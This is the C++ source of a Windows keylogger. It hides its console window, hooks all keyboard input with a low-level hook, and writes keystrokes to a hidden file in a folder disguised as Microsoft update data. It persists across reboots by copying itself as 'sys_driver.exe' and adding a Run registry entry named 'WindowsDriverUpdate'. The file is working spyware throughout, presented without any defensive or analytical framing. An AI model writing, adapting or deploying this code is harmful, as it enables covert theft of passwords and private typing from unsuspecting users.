#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <shlobj.h>

// the function find( or creates if doesnt exist) the dir to hide the file
std::wstring GetLogPath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        std::wstring logDir = std::wstring(path) + L"\\Microsoft\\Windows\\Updates";
        CreateDirectoryW(logDir.c_str(), NULL);
        return logDir + L"\\data_log.txt";
    }
    return L"keylog.txt";
}


void WriteToLog(std::wstring text) {
    static std::wstring finalPath = GetLogPath();
    std::wofstream logFile(finalPath, std::ios::app);
    if (logFile.is_open()) {
        logFile << text;
        logFile.close();

        //hide the file
        SetFileAttributesW(finalPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
}

// copy the data so runs even after restart
void EnsurePersistence() {
    wchar_t currentPath[MAX_PATH];
    wchar_t appDataPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        std::wstring destPath = std::wstring(appDataPath) + L"\\Microsoft\\Windows\\sys_driver.exe";

        // Only copy if we arent already running from the destination
        if (_wcsicmp(currentPath, destPath.c_str()) != 0) {
            if (CopyFileW(currentPath, destPath.c_str(), FALSE)) {
                HKEY hKey;
                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                    RegSetValueExW(hKey, L"WindowsDriverUpdate", 0, REG_SZ, (BYTE*)destPath.c_str(), (destPath.size() + 1) * sizeof(wchar_t));
                    RegCloseKey(hKey);
                }
            }
        }
    }
}


void SyncKeyboardState(BYTE* state) {
    for (int i = 0; i < 256; i++) {
        state[i] = GetKeyState(i);
    }
}

// the main callback for the project to keep it going
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = pKeyBoard->vkCode;

        // Special Key Handling
        if (vk == VK_RETURN) { WriteToLog(L"[ENTER]\n"); }
        else if (vk == VK_BACK) { WriteToLog(L"[BACKSPACE]"); }
        else if (vk == VK_TAB) { WriteToLog(L"[TAB]"); }
        else if (vk == VK_ESCAPE) { WriteToLog(L"[ESC]"); }
        else if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) { WriteToLog(L"[CTRL]"); }
        else {
            BYTE keyboardState[256];
            SyncKeyboardState(keyboardState);
            wchar_t buffer[5];
            int result = ToUnicode(vk, pKeyBoard->scanCode, keyboardState, buffer, 4, 0);
            if (result > 0) {
                buffer[result] = L'\0';
                WriteToLog(buffer);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    EnsurePersistence();

    // set the hook
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    // message loop to keep hook alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhkLowLevelKybd);
    return 0;
}